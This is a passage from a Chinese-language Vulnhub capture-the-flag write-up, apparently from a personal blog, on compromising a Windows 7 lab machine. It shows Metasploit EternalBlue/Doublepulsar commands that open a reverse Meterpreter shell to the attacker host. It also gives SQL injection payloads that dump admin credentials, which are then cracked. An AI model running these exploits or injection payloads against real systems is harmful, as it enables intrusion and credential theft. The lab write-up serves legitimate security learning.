class=\"hljs-number\"\u003e11\u003c/span\u003e    \\_ target: Automatic                         .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e    \\_ target: PowerShell                        .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e    \\_ target: Native upload                     .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e    \\_ target: MOF upload                        .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e    \\_ AKA: ETERNALSYNERGY                       .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e    \\_ AKA: ETERNALROMANCE                       .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e    \\_ AKA: ETERNALCHAMPION                      .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e    \\_ AKA: ETERNALBLUE                          .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e  auxiliary/admin/smb/ms17_010_command           \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-03\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-14\u003c/span\u003e       normal   No     MS17\u003cspan class=\"hljs-number\"\u003e-010\u003c/span\u003e EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e    \\_ AKA: ETERNALSYNERGY                       .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e    \\_ AKA: ETERNALROMANCE                       .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e    \\_ AKA: ETERNALCHAMPION                      .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e    \\_ AKA: ETERNALBLUE                          .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17\u003cspan class=\"hljs-number\"\u003e-010\u003c/span\u003e SMB RCE Detection\n   \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e    \\_ AKA: DOUBLEPULSAR                         .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e    \\_ AKA: ETERNALBLUE                          .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e  exploit/windows/smb/smb_doublepulsar_rce       \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-04\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-14\u003c/span\u003e       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n   \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e    \\_ target: Execute payload (x64)             .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e    \\_ target: Neutralize implant                .                .        .      .\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用 \u003ccode\u003eauxiliary/scanner/smb/smb_ms17_010\u003c/code\u003e 检查漏洞是否存在\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003e use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eauxiliary\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(scanner/smb/smb_ms17_010)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts 192.168.75.162\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eauxiliary\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(scanner/smb/smb_ms17_010)\u003c/span\u003e \u003e ru\n[+] 192.168.75.162:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 \u003cspan class=\"hljs-title function_\"\u003ex86\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit)\u003c/span\u003e\n[*] 192.168.75.162:445    - Scanned 1 of 1 \u003cspan class=\"hljs-title function_\"\u003ehosts\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\u003c/span\u003e\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能易受攻击，存在漏洞\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e渗透执行\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e使用永恒之蓝漏洞 \u003ccode\u003ems17_010_eternalblue\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003e use exploit/windows/smb/ms17_010_eternalblue \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e options\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts 192.168.75.162\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/ms17_010_eternalblue)\u003c/span\u003e \u003e run                                                                                                         \n                                                                                                                                                             \n[*] Started reverse TCP handler on 192.168.75.151:4444                                                                                                       \n[*] 192.168.75.162:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                   \n[+] 192.168.75.162:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 \u003cspan class=\"hljs-title function_\"\u003ex86\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit)\u003c/span\u003e                                     \n[*] 192.168.75.162:445    - Scanned 1 of 1 \u003cspan class=\"hljs-title function_\"\u003ehosts\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\u003c/span\u003e                                                                                             \n[+] 192.168.75.162:445 - The target is vulnerable.                                                                                                           \n[-] 192.168.75.162:445 - Exploit aborted due to failure: no-target: This module only supports \u003cspan class=\"hljs-title function_\"\u003ex64\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e-bit)\u003c/span\u003e targets                                           \n[*] Exploit completed, but no session was created.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提示 \u003ccode\u003eExploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e仅支持x64的模块，需要安装x32的模块\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e安装\u003ccode\u003ex86\u003c/code\u003e的模块\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e模块\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/1stPeak/Eternalblue-Doublepulsar-Metasploit-master\"\u003ehttps://github.com/1stPeak/Eternalblue-Doublepulsar-Metasploit-master\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003ekali没有32位的利用模块将下载下来的\u003ccode\u003eEternalblue-Doublepulsar-Metasploit-master\u003c/code\u003e的名字改为\u003ccode\u003eEternalblue-Doublepulsar-Metasploit\u003c/code\u003e并将改完名后的整个目录复制到root目录下(需要解压2次,把最后一次解压名改为Eternalblue-Doublepulsar-Metasploit 并放到/root目录下)\u003ccode\u003eeternalblue_doublepulsar.rb\u003c/code\u003e 拷贝到\u003ccode\u003e/usr/share/metasploitframework/modules/exploits/windows/smb\u003c/code\u003e目录下\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e安装框架\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003edpkg --add-architecture i386 \u0026#x26;\u0026#x26; apt-get update \u0026#x26;\u0026#x26; apt-get install wine32\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e执行模块\u003c/p\u003e\n\u003cp\u003e获得shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003e use exploit/windows/smb/eternalblue_doublepulsar \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/eternalblue_doublepulsar)\u003c/span\u003e \u003e options\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/eternalblue_doublepulsar)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts 192.168.75.162\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/eternalblue_doublepulsar)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e processinject explorer.exe\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/eternalblue_doublepulsar)\u003c/span\u003e \u003e exploit\n\u003cspan class=\"hljs-comment\"\u003e// 能成功但是反弹不了shell ， 修改processinject为lsass.exe\u003c/span\u003e\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/eternalblue_doublepulsar)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e processinject lsass.exe\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(windows/smb/eternalblue_doublepulsar)\u003c/span\u003e \u003e run\n\n[*] Started reverse TCP handler on 192.168.75.151:4444 \n[*] 192.168.75.162:445 - Generating Eternalblue XML data\n[*] 192.168.75.162:445 - Generating Doublepulsar XML data\n[*] 192.168.75.162:445 - Generating payload DLL \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Doublepulsar\n[*] 192.168.75.162:445 - Writing DLL in /root/.wine/drive_c/eternal11.dll\n[*] 192.168.75.162:445 - Launching Eternalblue...\n[+] 192.168.75.162:445 - Backdoor is already installed\n[*] 192.168.75.162:445 - Launching Doublepulsar...\n[*] Sending \u003cspan class=\"hljs-title function_\"\u003estage\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e176198\u003c/span\u003e bytes)\u003c/span\u003e to 192.168.75.162\n[*] Meterpreter session 1 \u003cspan class=\"hljs-title function_\"\u003eopened\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49233\u003c/span\u003e)\u003c/span\u003e at 2024-10-20 14:41:13 +0800\n[+] 192.168.75.162:445 - Remote code executed... 3... 2... 1...\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eflag2\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003ec\u003c/code\u003e盘根目录下存在\u003ccode\u003eflag2.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eC:\\Windows\\system32\u003eipconfig\nipconfig\n\nWindows IP ����\n\n���������� ��������:\n\n   �����ض��� DNS ��׺ . . . . . . . : localdomain\n   �������� IPv6 ��. . . . . . . . : fe80::ed56:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003ea0:d8a7:f304%\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e\n   IPv4 �� . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e\n   ��������  . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e255.0\u003c/span\u003e\n   Ĭ������. . . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\n\n���������� isatap.localdomain:\n\n   ý��״  . . . . . . . . . . . . : ý���ѶϿ�\n   �����ض��� DNS ��׺ . . . . . . . : localdomain\n\n���������� ��������*:\n\n   ý��״  . . . . . . . . . . . . : ý���ѶϿ�\n   �����ض��� DNS ��׺ . . . . . . . : \n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nC:\\Windows\\system32\u003eCd c:/\nCd c:/\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nc:\\\u003edir\ndir\n ������ C �еľ�û�б�ǩ��\n �������к��� D648-E0A4\n\n c:\\ ��Ŀ¼\n\n\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e07\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e    \u0026#x3C;DIR\u003e          Admin\n\u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e05\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e                \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e autoexec.bat\n\u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e05\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e                \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e config.sys\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e               \u003cspan class=\"hljs-number\"\u003e149\u003c/span\u003e flag2.txt\n\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e07\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e    \u0026#x3C;DIR\u003e          Home\n\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e    \u0026#x3C;DIR\u003e          inetpub\n\u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e07\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e    \u0026#x3C;DIR\u003e          PerfLogs\n\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e    \u0026#x3C;DIR\u003e          Program Files\n\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e07\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e    \u0026#x3C;DIR\u003e          Python27\n\u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e05\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e    \u0026#x3C;DIR\u003e          Users\n\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e    \u0026#x3C;DIR\u003e          Windows\n               \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e ���ļ�            \u003cspan class=\"hljs-number\"\u003e183\u003c/span\u003e ��\n               \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e ��Ŀ¼ \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e033\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e711\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003e ������\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nc:\\\u003etype flag2.txt\ntype flag2.txt\n��ϲ��!���ǵ�\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e��flag,��ȥ��ʣ�µ�flag��.\nflag{ajkwncalwrli}\n\n�ɴ��۾��Ϳ����ҵ�������.\n��\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e��flag����Administrator�û���������\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eflag3\u003c/h2\u003e\n\u003cp\u003e在靶机桌面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eC:\\Users\\Administrator\\Desktop\u003etype flag3.txt\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\ntype flag3.txt\nflag{cjdhrncalzos}\n\n��ϲ�ɹ���!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eflag{ajkwncalwrli}\u003c/code\u003e 继续寻找\u003ccode\u003eflag1\u003c/code\u003e ，可能在web\u003c/p\u003e\n\u003ch2\u003eweb渗透-1\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e前面nmap扫描出，存在有兴趣的目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e| http-\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eenum\u003c/span\u003e:\u003c/span\u003e \n|   /robots.txt: Robots file\n|_  /data/: Potentially interesting folder\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没什么有价值的东西\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e经测试\u003ccode\u003e/index.php?s=/news/1\u003c/code\u003e 存在注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) order by \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e%\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// 闭合成功\u003c/span\u003e\nindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) order by \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e%\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// 7个字段\u003c/span\u003e\nindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eunion\u003c/span\u003e select \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e %\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e **\u003cspan class=\"hljs-comment\"\u003e// 2 和 7 为显示位**\u003c/span\u003e\nindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eunion\u003c/span\u003e select \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,database(),\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e %\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e// 当前数据库为 tpx\u003c/span\u003e\nindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eunion\u003c/span\u003e select \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,user(),\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e %\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e   \u003cspan class=\"hljs-comment\"\u003e// 当前用户 root\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eunion\u003c/span\u003e select \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,group_concat(table_name),\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e from information_schema.tables where table_schema = database() %\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 得到表\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//  tpx_admin_access,tpx_admin_node,tpx_admin_role,tpx_admin_role_user,tpx_admin_user,tpx_cms_news,tpx_cms_partner,tpx_cms_product,tpx_cms_product_cat,tpx_cms_single_page,tpx_cms_slide,tpx_cms_tag_pool,tpx_config,tpx_data_files \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// tpx_admin_user 是我们感兴趣的\u003c/span\u003e\n\nindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eunion\u003c/span\u003e select \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,group_concat(column_name),\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e from information_schema.columns where table_schema = database() and table_name=\u003cspan class=\"hljs-string\"\u003e'tpx_admin_user'\u003c/span\u003e %\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 得到表 tpx_admin_user 的列\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//  id,username,password,password_salt,reg_time,reg_ip,last_login_time,last_login_ip,last_change_pwd_time,status \u003c/span\u003e\n\nindex.php?s=/news/\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eunion\u003c/span\u003e select \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,group_concat(\u003cspan class=\"hljs-string\"\u003e' username='\u003c/span\u003e,username,\u003cspan class=\"hljs-string\"\u003e' password='\u003c/span\u003e,password,\u003cspan class=\"hljs-string\"\u003e' salt='\u003c/span\u003e,password_salt),\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e from tpx_admin_user %\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 获得数据 username ，password的数据\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//   ,username=admin ,password=VFZSSmVrNUVWVEpaYlhneFdsRTlQUT09,salt=XGFnMdiWxf, ,username=admin2 ,password=e10adc3949ba59abbe56e057f20f883e,salt=IQKwyDoYFc, ,username=admin3 ,password=TVRJek5EVTJabmxRWldoS2NFZHhkZz09,salt=fyPehJpGqv, ,username=flag ,password=XTDXANDLDXY,salt=666666 \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e破解密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eadmin = \u003cspan class=\"hljs-number\"\u003e123456b\u003c/span\u003elue\nadmin2 = \u003cspan class=\"hljs-number\"\u003e123456\u003c/span\u003e\nadmin3 = \u003cspan class=\"hljs-number\"\u003e123456f\u003c/span\u003eyPehJpGqv\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eflag\u003c/h2\u003e\n\u003cp\u003esql注入获得flag \u003ccode\u003eXTDXANDLDXY\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003eweb渗透-2\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e扫描登陆页面 ，\u003ccode\u003eadmin.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eadmin = \u003cspan class=\"hljs-number\"\u003e123456b\u003c/span\u003elue\nadmin2 = \u003cspan class=\"hljs-number\"\u003e123456\u003c/span\u003e\nadmin3 = \u003cspan class=\"hljs-number\"\u003e123456f\u003c/span\u003eyPehJpGqv\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e均登陆失败\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e得知密码是\u003ccode\u003eVFZSSmVrNUVWVEpaYlhneFdsRTlQUT09\u003c/code\u003e解码两次的结果\u003ccode\u003eMTIzNDU2Ymx1ZQ==\u003c/code\u003e ….\u003c/p\u003e\n\u003cp\u003e登陆成功\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - win7-attack","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"win7-attack\n\n by gongli\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`161`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n5. 一波操作，web服务器是`IIS 7.5` ，mysql版本是`5.5.11` ,以及..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - 